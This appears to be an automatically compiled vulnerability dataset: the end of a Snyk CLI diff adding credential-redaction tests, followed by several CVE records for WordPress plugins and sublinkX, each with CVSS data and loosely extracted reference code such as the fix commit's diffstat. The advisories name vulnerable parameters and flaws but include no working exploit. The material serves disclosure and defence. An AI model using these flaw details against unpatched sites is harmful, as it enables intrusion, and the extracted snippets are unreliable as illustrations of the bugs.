+          SNYK_DISABLE_ANALYTICS: '1',
+        },
+      },
+    );
+
+    expect(stderr).not.toContain('Basic am9ob');
+    expect(stderr).toContain('Basic ***');
+
+    expect(stderr).not.toContain('john.doe@domain.org');
+    expect(stderr).not.toContain('solidpassword');
+
+    expect(stderr).toContain('-u=***');
+    expect(stderr).toContain('-p=***');
+  });
+
+  it('redacts ENV-driven basic authentication', async () => {
+    const { stderr } = await runSnykCLI('container test ubuntu:latest -d', {
+      env: {
+        ...process.env,
+        SNYK_DISABLE_ANALYTICS: '1',
+        SNYK_REGISTRY_USERNAME: 'john.doe@domain.org',
+        SNYK_REGISTRY_PASSWORD: 'solidpassword',
+      },
+    });
+
+    expect(stderr).not.toContain('Basic am9ob');
+    expect(stderr).toContain('Basic ***');
+
+    expect(stderr).not.toContain('john.doe@domain.org');
+    expect(stderr).not.toContain('solidpassword');
+  });
+
+  it('redacts basic authentication with trace log level', async () => {
+    const { stderr } = await runSnykCLI(
+      'container test ubuntu:latest --username=john.doe@domain.org --password=solidpassword -d',
+      {
+        env: {
+          ...process.env,
+          SNYK_DISABLE_ANALYTICS: '1',
+          SNYK_LOG_LEVEL: 'trace',
+        },
+      },
+    );
+
+    expect(stderr).not.toContain('Basic am9ob');
+    expect(stderr).toContain('Basic ***');
+
+    expect(stderr).not.toContain('john.doe@domain.org');
+    expect(stderr).not.toContain('solidpassword');
+
+    expect(stderr).toContain('"username": "***"');
+    expect(stderr).toContain('"password": "***"');
+  });
+
+  it('redacts short-form basic authentication with trace log level', async () => {
+    const { stderr } = await runSnykCLI(
+      'container test ubuntu:latest -u=john.doe@domain.org -p=solidpassword -d',
       {
         env: {
           ...process.env,
@@ -58,11 +136,37 @@ describe('debug log', () => {
       },
     );
 
-    // this test only makes sense when Basic auth would be expected, otherwise the checks below
-    if (stderr.includes('Basic ')) {
-      expect(stderr).not.toContain('Basic dXM6cHc=');
-      expect(stderr).toContain('Basic ***');
-    }
+    expect(stderr).not.toContain('Basic am9ob');
+    expect(stderr).toContain('Basic ***');
+
+    expect(stderr).not.toContain('john.doe@domain.org');
+    expect(stderr).not.toContain('solidpassword');
+
+    expect(stderr).toContain('-u=***');
+    expect(stderr).toContain('"u": "***"');
+    expect(stderr).toContain('-p=***');
+    expect(stderr).toContain('"p": "***"');
+  });
+
+  it('redacts ENV-driven basic authentication with trace log level', async () => {
+    const { stderr } = await runSnykCLI('container test ubuntu:latest -d', {
+      env: {
+        ...process.env,
+        SNYK_DISABLE_ANALYTICS: '1',
+        SNYK_REGISTRY_USERNAME: 'john.doe@domain.org',
+        SNYK_REGISTRY_PASSWORD: 'solidpassword',
+        SNYK_LOG_LEVEL: 'trace',
+      },
+    });
+
+    expect(stderr).not.toContain('Basic am9ob');
+    expect(stderr).toContain('Basic ***');
+
+    expect(stderr).not.toContain('john.doe@domain.org');
+    expect(stderr).not.toContain('solidpassword');
+
+    expect(stderr).toContain('"REGISTRY_USERNAME": "***"');
+    expect(stderr).toContain('"REGISTRY_PASSWORD": "***"');
   });
 
   it('redacts externally injected bearer token', async () => {
diff --git a/ts-binary-wrapper/src/common.ts b/ts-binary-wrapper/src/common.ts
index 13ef64c9e3..7b317af24b 100644
--- a/ts-binary-wrapper/src/common.ts
+++ b/ts-binary-wrapper/src/common.ts
@@ -181,9 +181,7 @@ export function runWrapper(executable: string, cliArguments: string[]): number {
   const debug = debugEnabled(cliArguments);
 
   if (debug) {
-    logErrorWithTimeStamps(
-      'Executing: ' + executable + ' ' + cliArguments.join(' '),
-    );
+    logErrorWithTimeStamps('Executing: ' + executable);
   }
 
   const res = spawnSync(executable, cliArguments, {


================================================================================


CVE ID: CVE-2025-6537
Published: 2025-06-26T03:15:25.277
Modified: 2025-07-08T11:34:13.310
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The Namasha By Mdesign plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘playicon_title’ parameter in all versions up to, and including, 1.2.00 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with Contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (2):
  1. https://wordpress.org/plugins/namasha-by-mdesign/#developers [Product, Release Notes]
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/3f7616d0-7b42-4b2e-8378-18c24c7bf22b?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/namasha-by-mdesign/#developers ---
/wp-content/plugins/persianadminfonts-bymdez

/wp-admin/options-general.php?page=namasha-settings

================================================================================


CVE ID: CVE-2025-5588
Published: 2025-06-26T02:15:22.107
Modified: 2025-06-26T18:57:43.670
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The Image Editor by Pixo plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘download’ parameter in all versions up to, and including, 2.3.6 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with Contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (4):
  1. https://plugins.trac.wordpress.org/browser/image-editor-by-pixo/trunk/frontend.php#L42
  2. https://plugins.trac.wordpress.org/changeset/3315303/
  3. https://wordpress.org/plugins/image-editor-by-pixo/#developers
  4. https://www.wordfence.com/threat-intel/vulnerabilities/id/1036a34d-ec03-4bec-8455-02c83fdb8b36?source=cve

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/image-editor-by-pixo/#developers ---
/wp-content/plugins/pixo

================================================================================


CVE ID: CVE-2025-3863
Published: 2025-06-26T02:15:20.200
Modified: 2025-07-03T17:09:19.293
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-862: Missing Authorization

Description:
The Post Carousel Slider for Elementor plugin for WordPress is vulnerable to improper authorization due to a missing capability check on the process_wbelps_promo_form() function in all versions up to, and including, 1.6.0. This makes it possible for authenticated attackers, with Subscriber-level access and above, to trigger the plugin’s support‐form handler to send arbitrary emails to the site’s support address.

References (4):
  1. https://plugins.trac.wordpress.org/browser/post-carousel-slider-for-elementor/tags/1.5.0/support-page/class-support-page.php#L28 [Product]
  2. https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3316424%40post-carousel-slider-for-elementor&new=3316424%40post-carousel-slider-for-elementor&sfp_email=&sfph_mail= [Patch]
  3. https://wordpress.org/plugins/post-carousel-slider-for-elementor/#developers [Product]
  4. https://www.wordfence.com/threat-intel/vulnerabilities/id/0b92afdf-51e0-4cf5-9f2b-997b9ff98b23?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/post-carousel-slider-for-elementor/#developers ---
Elementor\Widgets_Manager::register_widget_type

elementor/widgets/widgets_registered

================================================================================


CVE ID: CVE-2025-6669
Published: 2025-06-25T23:15:21.310
Modified: 2025-06-27T11:15:25.547
CVSS Score: 3.7 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-320: CWE-320
  - CWE-321: CWE-321

Description:
A vulnerability was found in gooaclok819 sublinkX up to 1.8. It has been declared as problematic. This vulnerability affects unknown code of the file middlewares/jwt.go. The manipulation with the input sublink leads to use of hard-coded cryptographic key
 . The attack can be initiated remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.9 is able to address this issue. The patch is identified as 778d26aef723daa58df98c8060c43f5bf5d1b10b. It is recommended to upgrade the affected component.

References (7):
  1. https://github.com/gooaclok819/sublinkX/commit/778d26aef723daa58df98c8060c43f5bf5d1b10b
  2. https://github.com/gooaclok819/sublinkX/issues/68
  3. https://github.com/gooaclok819/sublinkX/issues/68#issuecomment-2957290524
  4. https://github.com/gooaclok819/sublinkX/releases/tag/1.9
  5. https://vuldb.com/?ctiid.313882
  6. https://vuldb.com/?id.313882
  7. https://vuldb.com/?submit.602368

Attempting to extract code examples from references...

--- Code from https://github.com/gooaclok819/sublinkX/commit/778d26aef723daa58df98c8060c43f5bf5d1b10b ---
From 778d26aef723daa58df98c8060c43f5bf5d1b10b Mon Sep 17 00:00:00 2001
From: gooaclok819 <gooaclok819@gmail.com>
Date: Tue, 10 Jun 2025 05:08:02 +0800
Subject: [PATCH] 1.9

---
 .github/workflows/docker-image.yml            |  40 --
 .gitignore                                    |   3 +-
 README.en-US.md                               |  11 +-
 README.md                                     |  14 +-
 api/auth.go                                   |  10 +-
 api/clients.go                                |   6 +-
 api/node.go                                   |   6 +-
 api/sub.go                                    | 126 +++--
 api/user.go                                   |   4 +-
 build.sh                                      |   3 +-
 demo.sh                                       |   4 -
 install.sh                                    | 454 ++++++++++++++++--
 main.go                                       |  12 +-
 menu.sh                                       | 166 -------
 middlewares/jwt.go                            |   6 +-
 models/config.go                              |  88 +++-
 models/subcription.go                         | 145 ++++--
 node/clash.go                                 |   2 +-
 routers/user.go                               |   2 +-
 static/css/el-alert.B9oGCRyi.css              |   1 -
 static/css/el-alert.G57rL0jl.css              |   1 +
 static/css/el-dialog.Cop0q8z2.css             |   1 +
 static/css/el-dialog.DCGCHX2q.css             |   1 -
 static/css/el-form-item.BqrJjMte.css          |   1 +
 static/css/el-form-item.uSAh9oyp.css          |   1 -
 static/css/el-image-viewer.BJ_nFYFt.css       |   1 -
 static/css/el-image-viewer.gjGgbSV7.css       |   1 +
 static/css/el-link.B58a4a3I.css               |   1 +
 static/css/el-link.Dkj8bMmD.css               |   1 -
 ...ct.BaQA8IKP.css => el-select.CvzM3W2w.css} |   2 +-
 static/css/el-table-column.BfJ1jZWA.css       |   1 -
 static/css/el-table-column.DICiW8BK.css       |   1 +
 static/css/el-tabs.BURcj4qt.css               |   1 -
 static/css/el-tabs.BihFZC1O.css               |   1 +
 ...{index.CJKN3zBj.css => index.BlP5mz1q.css} |   2 +-
 static/css/index.C4eKYwfq.css                 |   1 +
 static/css/index.DZhVAj3G.css                 |   1 -
 .../{node.wSVBx8Lp.css => node.BTLfVIp4.css}  |   2 +-
 static/css/set.BBN4KMaE.css                   |   1 +
 static/css/set.BMjHnBvk.css                   |   1 -
 static/css/subs.B8TH4pkl.css                  |   1 +
 static/css/subs.JwB3fIbV.css                  |   1 -
 static/index.html                             |   4 +-
 static/js/401.2cRCE_5G.js                     |   1 -
 static/js/401.A8ivxQe-.js                     |   1 +
 .../js/{404.DlqBpkU7.js => 404.oOGe90N9.js}   |   2 +-
 static/js/BarChart.BhtXtCgr.js                |   1 -
 static/js/BarChart.oxEucXyN.js                |   1 +
 ...rt.L2tIbyMX.js => FunnelChart.DNDcYTtE.js} |   2 +-
 static/js/PieChart.BqKF5xSm.js                |   1 +
 static/js/PieChart.mgwtBU-p.js                |   1 -
 static/js/RadarChart.DbQwq7oR.js              |   1 +
 static/js/RadarChart.TGxAW552.js              |   1 -
 ...8iq1wq.js => _initCloneObject.CdEb-nKU.js} |   2 +-
 ...{apifox.IXUmMSaC.js => apifox.CYnsXVba.js} |   2 +-
 ...rray.BN0gQOTw.js => castArray.Bz5-nP3Z.js} |   2 +-
 ...ounce.i1DMUZzi.js => debounce.Dto-6gXK.js} |   2 +-
 static/js/dict.B6ktMwQ2.js                    |   1 -
 static/js/dict.BSgFWhK7.js                    |   1 +
 static/js/dropdown.C8ii2HAP.js                |   1 +
 static/js/dropdown.CqG_2FXV.js                |   1 -
 static/js/el-alert.C4kfmMUd.js                |   1 +
 static/js/el-alert.IAJrxUBM.js                |   1 -
 static/js/el-card.BtD6lis4.js                 |   1 +
 static/js/el-card.DWbysKpS.js                 |   1 -
 static/js/el-col.CSFVcDlT.js                  |   1 +
 static/js/el-col.DNKSa6YX.js                  |   1 -
 static/js/el-dialog.BgwkivRZ.js               |   1 +
 static/js/el-dialog.Dis4ipFy.js               |   1 -
 static/js/el-form-item.BmzvT5P_.js            |   1 +
 static/js/el-form-item.UpoTeuOf.js            |   1 -
 static/js/el-image-viewer.BFbI4qeV.js         |   1 +
 static/js/el-image-viewer.Ck07Xbtu.js         |   1 -
 static/js/el-link.BTv-HaC_.js                 |   1 -
 static/js/el-link.Dy3TrIP0.js                 |   1 +
 static/js/el-popper.BOk2pAjG.js               |   1 +
 static/js/el-popper.e9kr8u9Q.js               |   1 -
 static/js/el-scrollbar.BWFBt2l1.js            |   1 +
 static/js/el-scrollbar.DlPh6Z7D.js            |   1 -
 static/js/el-select.dUFpYm6H.js               |   1 -
 static/js/el-select.ig4666ag.js               |   1 +
 static/js/el-switch.C2enjB5d.js               |   1 +
 static/js/el-switch.zYake_dz.js               |   1 -
 static/js/el-table-column.B8f3rlJz.js         |   1 +
 static/js/el-table-column.haX2jq5s.js         |   1 -
 static/js/el-tabs.C9qKjW-L.js                 |   1 +
 static/js/el-tabs.DDmXOrX8.js                 |   1 -
 static/js/el-tag.CLWce1kX.js                  |   1 -
 static/js/el-tag.dVQ_5BVp.js                  |   1 +
 static/js/icon-selector.B8xqxj5a.js           |   1 -
 static/js/icon-selector.BDDDRxZx.js           |   1 +
 static/js/icons.CLwEP9y6.js                   |   1 +
 static/js/icons.DgB57Xkx.js                   |   1 -
 static/js/index.9PHSMUIB.js                   |   2 -
 static/js/index.9UoVjQ1v.js                   |   1 -
 static/js/index.B2Hg7VBR.js                   |   1 -
 static/js/index.BB3n5hnY.js                   |   1 +
 static/js/index.BBNS_uLM.js                   |   1 -
 static/js/index.BEs2tgIy.js                   |   1 +
 static/js/index.BTVf4LI1.js                   |   1 +
 static/js/index.BfcEpzPY.js                   |   1 -
 static/js/index.BrHL87wj.js                   |   1 -
 static/js/index.BrmtYoMG.js                   |   1 +
 static/js/index.C4hOZ5W6.js                   |   1 +
 .../{index.CM09xEA_.js => index.COwZ25X4.js}  |   2 +-
 static/js/index.CULjW3Hk.js                   |   1 +
 static/js/index.CnrCGsB5.js                   |   1 +
 static/js/index.D5Q7nPxR.js                   |   1 +
 static/js/index.D6nSmJHY.js                   |   1 -
 static/js/index.D7zGuEZp.js                   |   1 -
 static/js/index.DNYq9Wso.js                   |   1 -
 static/js/index.DQt7LRo_.js                   |   2 +
 static/js/index.DpZd_Lnx.js                   |   1 +
 static/js/internal-doc.B6eN2GGk.js            |   1 -
 static/js/internal-doc.BtqR0xRB.js            |   1 +
 ...sEqual.DDyRMzJ4.js => isEqual.CRCpD0bX.js} |   2 +-
 static/js/isUndefined.DgmxjSXK.js             |   1 -
 static/js/knife4j.C3XegEf8.js                 |   1 -
 static/js/knife4j.DpzuQMf0.js                 |   1 +
 static/js/level1.DbJgCAxV.js                  |   1 -
 static/js/level1.oGeow6KW.js                  |   1 +
 static/js/level2.CXm5yCsd.js                  |   1 -
 static/js/level2.VmkE7n-X.js                  |   1 +
 static/js/level3-1.BUUzsNUz.js                |   1 +
 static/js/level3-1.veb2CjDd.js                |   1 -
 static/js/level3-2.DzCkFumo.js                |   1 +
 static/js/level3-2.ehpMX2NG.js                |   1 -
 static/js/node.B7CBv-vw.js                    |   1 -
 static/js/node.Dac5foo2.js                    |   1 +
 static/js/nodes.BvTKFj9V.js                   |   1 -
 static/js/nodes.DWWjcAer.js                   |   1 +
 ...ition.CopxYfyp.js => position.DlWUUiGS.js} |   2 +-
 static/js/refs.CNClepWF.js                    |   1 -
 static/js/refs.DfdxW6x2.js                    |   1 +
 static/js/set.DCph2DiX.js                     |   1 -
 static/js/set.D_ZTs_bD.js                     |   1 +
 static/js/signature.5Hv-l5jE.js               |   1 -
 static/js/signature.BnAs3F8Q.js               |   1 +
 ...trings.CQ_np2th.js => strings.CUsguf90.js} |   2 +-
 static/js/subs.1dXoageE.js                    |   1 -
 static/js/subs.CUOV2WbQ.js                    |   1 +
 ...wagger.BGskywol.js => swagger.CSJ9B_PJ.js} |   2 +-
 .../js/{temp.gJIG3-Be.js => temp.DAKXAXN0.js} |   2 +-
 static/js/template.C1Fhr0SI.js                |   1 +
 static/js/template.iDasYWHy.js                |   1 -
 static/js/upload.DkIgLQ_p.js                  |   1 -
 static/js/upload.Dn3W5VcS.js                  |   1 +
 static/js/use-dialog.CybRpRek.js              |   1 -
 static/js/use-dialog.DYJdXddk.js              |   1 +
 static/js/wang-editor.Cmb5yULV.js             |   1 +
 static/js/wang-editor.CovtB-Ke.js             |   1 -
 static/js/websocket.C8KDU47E.js               |   1 +
 static/js/websocket.YJwVKVlt.js               |   1 -
 sublink_win64.exe                             | Bin 0 -> 24410624 bytes
 utils/rand.go                                 |  21 +
 webs/package.json                             |   1 +
 webs/src/api/user/index.ts                    |  17 +-
 webs/src/views/subcription/subs.vue           |  50 ++
 webs/src/views/system/user/set.vue            |   8 +-
 159 files changed, 907 insertions(+), 446 deletions(-)
 delete mode 100644 .github/workflows/docker-image.yml
 delete mode 100644 demo.sh
 delete mode 100644 menu.sh
 delete mode 100644 static/css/el-alert.B9oGCRyi.css
 create mode 100644 static/css/el-alert.G57rL0jl.css
 create mode 100644 static/css/el-dialog.Cop0q8z2.css
 delete mode 100644 static/css/el-dialog.DCGCHX2q.css
 create mode 100644 static/css/el-form-item.BqrJjMte.css
 delete mode 100644 static/css/el-form-item.uSAh9oyp.css
 delete mode 100644 static/css/el-image-viewer.BJ_nFYFt.css
 create mode 100644 static/css/el-image-viewer.gjGgbSV7.css
 create mode 100644 static/css/el-link.B58a4a3I.css
 delete mode 100644 static/css/el-link.Dkj8bMmD.css
 rename static/css/{el-select.BaQA8IKP.css => el-select.CvzM3W2w.css} (60%)
 delete mode 100644 static/css/el-table-column.BfJ1jZWA.css
 create mode 100644 static/css/el-table-column.DICiW8BK.css
 delete mode 100644 static/css/el-tabs.BURcj4qt.css
 create mode 100644 static/css/el-tabs.BihFZC1O.css
 rename static/css/{index.CJKN3zBj.css => index.BlP5mz1q.css} (63%)
 create mode 100644 static/css/index.C4eKYwfq.css
 delete mode 100644 static/css/index.DZhVAj3G.css
 rename static/css/{node.wSVBx8Lp.css => node.BTLfVIp4.css} (84%)
 create mode 100644 static/css/set.BBN4KMaE.css
 delete mode 100644 static/css/set.BMjHnBvk.css
 create mode 100644 static/css/subs.B8TH4pkl.css
 delete mode 100644 static/css/subs.JwB3fIbV.css
 delete mode 100644 static/js/401.2cRCE_5G.js
 create mode 100644 static/js/401.A8ivxQe-.js
 rename static/js/{404.DlqBpkU7.js => 404.oOGe90N9.js} (88%)
 delete mode 100644 static/js/BarChart.BhtXtCgr.js
 create mode 100644 static/js/BarChart.oxEucXyN.js
 rename static/js/{FunnelChart.L2tIbyMX.js => FunnelChart.DNDcYTtE.js} (76%)
 create mode 100644 static/js/PieChart.BqKF5xSm.js
 delete mode 100644 static/js/PieChart.mgwtBU-p.js
 create mode 100644 static/js/RadarChart.DbQwq7oR.js
 delete mode 100644 static/js/RadarChart.TGxAW552.js
 rename static/js/{_initCloneObject.cf8iq1wq.js => _initCloneObject.CdEb-nKU.js} (60%)
 rename static/js/{apifox.IXUmMSaC.js => apifox.CYnsXVba.js} (54%)
 rename static/js/{castArray.BN0gQOTw.js => castArray.Bz5-nP3Z.js} (53%)
 rename static/js/{debounce.i1DMUZzi.js => debounce.Dto-6gXK.js} (95%)
 delete mode 100644 static/js/dict.B6ktMwQ2.js
 create mode 100644 static/js/dict.BSgFWhK7.js
 create mode 100644 static/js/dropdown.C8ii2HAP.js
 delete mode 100644 static/js/dropdown.CqG_2FXV.js
 create mode 100644 static/js/el-alert.C4kfmMUd.js
 delete mode 100644 static/js/el-alert.IAJrxUBM.js
 create mode 100644 static/js/el-card.BtD6lis4.js
 delete mode 100644 static/js/el-card.DWbysKpS.js
 create mode 100644 static/js/el-col.CSFVcDlT.js
 delete mode 100644 static/js/el-col.DNKSa6YX.js
 create mode 100644 static/js/el-dialog.BgwkivRZ.js
 delete mode 100644 static/js/el-dialog.Dis4ipFy.js
 create mode 100644 static/js/el-form-item.BmzvT5P_.js
 delete mode 100644 static/js/el-form-item.UpoTeuOf.js
 create mode 100644 static/js/el-image-viewer.BFbI4qeV.js
 delete mode 100644 static/js/el-image-viewer.Ck07Xbtu.js
 delete mode 100644 static/js/el-link.BTv-HaC_.js
 create mode 100644 static/js/el-link.Dy3TrIP0.js
 create mode 100644 static/js/el-popper.BOk2pAjG.js
 delete mode 100644 static/js/el-popper.e9kr8u9Q.js
 create mode 100644 static/js/el-scrollbar.BWFBt2l1.js
 delete mode 100644 static/js/el-scrollbar.DlPh6Z7D.js
 delete mode 100644 static/js/el-select.dUFpYm6H.js
 create mode 100644 static/js/el-select.ig4666ag.js
 create mode 100644 static/js/el-switch.C2enjB5d.js
 delete mode 100644 static/js/el-switch.zYake_dz.js
 create mode 100644 static/js/el-table-column.B8f3rlJz.js
 delete mode 100644 static/js/el-table-column.haX2jq5s.js
 create mode 100644 static/js/el-tabs.C9qKjW-L.js
 delete mode 100644 static/js/el-tabs.DDmXOrX8.js
 delete mode 100644 static/js/el-tag.CLWce1kX.js
 create mode 100644 static/js/el-tag.dVQ_5BVp.js
 delete mode 100644 static/js/icon-selector.B8xqxj5a.js
 create mode 100644 static/js/icon-selector.BDDDRxZx.js
 create mode 100644 static/js/icons.CLwEP9y6.js
 delete mode 100644 static/js/icons.DgB57Xkx.js
 delete mode 100644 static/js/index.9PHSMUIB.js
 delete mode 100644 static/js/index.9UoVjQ1v.js
 delete mode 100644 static/js/index.B2Hg7VBR.js
 create mode 100644 static/js/index.BB3n5hnY.js
 delete mode 100644 static/js/index.BBNS_uLM.js
 create mode 100644 static/js/index.BEs2tgIy.js
 create mode 100644 static/js/index.BTVf4LI1.js
 delete mode 100644 static/js/index.BfcEpzPY.js
 delete mode 100644 static/js/index.BrHL87wj.js
 create mode 100644 static/js/index.BrmtYoMG.js
 create mode 100644 static/js/index.C4hOZ5W6.js
 rename static/js/{index.CM09xEA_.js => index.COwZ25X4.js} (78%)
 create mode 100644 static/js/index.CULjW3Hk.js
 create mode 100644 static/js/index.CnrCGsB5.js
 create mode 100644 static/js/index.D5Q7nPxR.js
 delete mode 100644 static/js/index.D6nSmJHY.js
 delete mode 100644 static/js/index.D7zGuEZp.js
 delete mode 100644 static/js/index.DNYq9Wso.js
 create mode 100644 static/js/index.DQt7LRo_.js
 create mode 100644 static/js/index.DpZd_Lnx.js
 delete mode 100644 static/js/internal-doc.B6eN2GGk.js
 create mode 100644 static/js/internal-doc.BtqR0xRB.js
 rename static/js/{isEqual.DDyRMzJ4.js => isEqual.CRCpD0bX.js} (82%)
 delete mode 100644 static/js/isUndefined.DgmxjSXK.js
 delete mode 100644 static/js/knife4j.C3XegEf8.js
 create mode 100644 static/js/knife4j.DpzuQMf0.js
 delete mode 100644 static/js/level1.DbJgCAxV.js
 create mode 100644 static/js/level1.oGeow6KW.js
 delete mode 100644 static/js/level2.CXm5yCsd.js
 create mode 100644 static/js/level2.VmkE7n-X.js
 create mode 100644 static/js/level3-1.BUUzsNUz.js
 delete mode 100644 static/js/level3-1.veb2CjDd.js
 create mode 100644 static/js/level3-2.DzCkFumo.js
 delete mode 100644 static/js/level3-2.ehpMX2NG.js
 delete mode 100644 static/js/node.B7CBv-vw.js
 create mode 100644 static/js/node.Dac5foo2.js
 delete mode 100644 static/js/nodes.BvTKFj9V.js
 create mode 100644 static/js/nodes.DWWjcAer.js
 rename static/js/{position.CopxYfyp.js => position.DlWUUiGS.js} (88%)
 delete mode 100644 static/js/refs.CNClepWF.js
 create mode 100644 static/js/refs.DfdxW6x2.js
 delete mode 100644 static/js/set.DCph2DiX.js
 create mode 100644 static/js/set.D_ZTs_bD.js
 delete mode 100644 static/js/signature.5Hv-l5jE.js
 create mode 100644 static/js/signature.BnAs3F8Q.js
 rename static/js/{strings.CQ_np2th.js => strings.CUsguf90.js} (56%)
 delete mode 100644 static/js/subs.1dXoageE.js
 create mode 100644 static/js/subs.CUOV2WbQ.js
 rename static/js/{swagger.BGskywol.js => swagger.CSJ9B_PJ.js} (50%)
 rename static/js/{temp.gJIG3-Be.js => temp.DAKXAXN0.js} (87%)
 create mode 100644 static/js/template.C1Fhr0SI.js
 delete mode 100644 static/js/template.iDasYWHy.js
 delete mode 100644 static/js/upload.DkIgLQ_p.js
 create mode 100644 static/js/upload.Dn3W5VcS.js
 delete mode 100644 static/js/use-dialog.CybRpRek.js
 create mode 100644 static/js/use-dialog.DYJdXddk.js
 create mode 100644 static/js/wang-editor.Cmb5yULV.js
 delete mode 100644 static/js/wang-editor.CovtB-Ke.js
 create mode 100644 static/js/websocket.C8KDU47E.js
 delete mode 100644 static/js/websocket.YJwVKVlt.js
 create mode 100644 sublink_win64.exe
 create mode 100644 utils/rand.go

diff --git a/.github/workflows/docker-image.yml b/.github/workflows/docker-image.yml
deleted file mode 100644
index 053e31e..0000000
--- a/.github/workflows/docker-image.yml
+++ /dev/null
@@ -1,40 +0,0 @@
-name: Build and Push Multi-Arch Docker Image
-
-on:
-  push:
-    branches:
-      - main
-  pull_request:
-    branches:
-      - main
-
-jobs:
-  build:
-    runs-on: ubuntu-latest
-
-    steps:
-      # 检出代码
-      - name: Checkout code
-        uses: actions/checkout@v2
-
-      # 设置 QEMU 以支持跨架构构建
-      - name: Set up QEMU
-        uses: docker/setup-qemu-action@v2
-
-      # 设置 Docker Buildx
-      - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v2
-
-      # 登录到 Docker Hub
-      - name: Log in to Docker Hub
-        uses: docker/login-action@v2
-        with:
-          username: ${{ secrets.DOCKER_USERNAME }}
-          password: ${{ secrets.DOCKER_PASSWORD }}
-
-      # 构建并推送多平台 Docker 镜像
-      - name: Build and Push Multi-Arch Docker Image
-        run: |
-          docker buildx build --platform linux/amd64,linux/arm64 \
-            -t jaaksi/sublinkx:latest \
-            --push .
diff --git a/.gitignore b/.gitignore
index 4ecfa82..3390dd7 100644
--- a/.gitignore
+++ b/.gitignore
@@ -4,4 +4,5 @@ db
 logs
 sublink_amd64 
 sublink_arm64
-sublink.exe
\ No newline at end of file
+sublink.exe
+install.sh
\ No newline at end of file
diff --git a/README.en-US.md b/README.en-US.md
index f827060..6a7ded9 100644
--- a/README.en-US.md
+++ b/README.en-US.md
@@ -45,9 +45,16 @@ surge support protocol:ss trojan vmess hy2 tuic
 
 ## [Updated Description]
 
-Add specified client
+####Backend Update
 
-Fix menu update function not updating menu version
+1. Enhanced authentication keys are random characters
+2. Added db/config.yaml configuration file 
+   Support custom keys (default random) Key expiration time (default 14 days) Port (default 8000)
+
+####Front-end update
+
+1. Fixed user reset password truncated issue
+2. Add subscription nodes at the front end Support drag sorting
 
 ## [Installation instructions]
 ### linux method:
diff --git a/README.md b/README.md
index 2065442..51948f6 100644
--- a/README.md
+++ b/README.md
@@ -46,9 +46,19 @@ surge支持协议:ss trojan vmess hy2 tuic
 
 ## [更新说明]
 
-新增指定客户端
+#### 后端更新
+
+1. 增强身份验证密钥为随机字符
+2. 新增db/config.yaml配置文件 
+   支持自定义密钥(默认随机) 密钥过期时间(默认14天) 端口(默认8000)
+
+#### 前端更新
+
+1. 修复用户重设密码被截断问题
+2. 前端添加订阅节点支持拖拽排序
+
+
 
-修复菜单更新功能没更新菜单版本
 
 ## [安装说明]
 ### linux方式：
diff --git a/api/auth.go b/api/auth.go
index 3395023..2b773d5 100644
--- a/api/auth.go
+++ b/api/auth.go
@@ -13,12 +13,14 @@ import (
 
 // 获取token
 func GetToken(username string) (string, error) {
+	// 过期时间天
+	ExpireDays := models.ReadConfig().ExpireDays
 	c := &middlewares.JwtClaims{
 		Username: username,
 		StandardClaims: jwt.StandardClaims{
-			ExpiresAt: time.Now().Add(time.Hour * 24 * 14).Unix(), // 设置14天过期
-			IssuedAt:  time.Now().Unix(),                          // 签发时间
-			Subject:   username,                                   // 用户
+			ExpiresAt: time.Now().Add(time.Hour * 24 * time.Duration(ExpireDays)).Unix(), // 设置过期时间
+			IssuedAt:  time.Now().Unix(),                                                 // 签发时间
+			Subject:   username,                                                          // 用户
 		},
 	}
 	token := jwt.NewWithClaims(jwt.SigningMethodHS256, c)
@@ -72,7 +74,7 @@ func UserLogin(c *gin.Context) {
 	// 生成token
 	token, err := GetToken(username)
 	if err != nil {
-		log.Println("获取token失败")
+		log.Println("获取token失败", err)
 		c.JSON(400, gin.H{
 			"msg": "获取token失败",
 		})
diff --git a/api/clients.go b/api/clients.go
index e7b9fc8..62cc8c0 100644
--- a/api/clients.go
+++ b/api/clients.go
@@ -110,7 +110,7 @@ func GetV2ray(c *gin.Context) {
 		c.Writer.WriteString("找不到这个订阅:" + SunName)
 		return
 	}
-	err = sub.GetSub()
+	err = sub.Find()
 	if err != nil {
 		c.Writer.WriteString("读取错误")
 		return
@@ -156,7 +156,7 @@ func GetClash(c *gin.Context) {
 		c.Writer.WriteString("找不到这个订阅:" + SunName)
 		return
 	}
-	err = sub.GetSub()
+	err = sub.Find()
 	if err != nil {
 		c.Writer.WriteString("读取错误")
 		return
@@ -215,7 +215,7 @@ func GetSurge(c *gin.Context) {
 		c.Writer.WriteString("找不到这个订阅:" + SunName)
 		return
 	}
-	err = sub.GetSub()
+	err = sub.Find()
 	if err != nil {
 		c.Writer.WriteString("读取错误")
 		return
diff --git a/api/node.go b/api/node.go
index b5bdc36..3403fda 100644
--- a/api/node.go
+++ b/api/node.go
@@ -14,11 +14,11 @@ import (
 
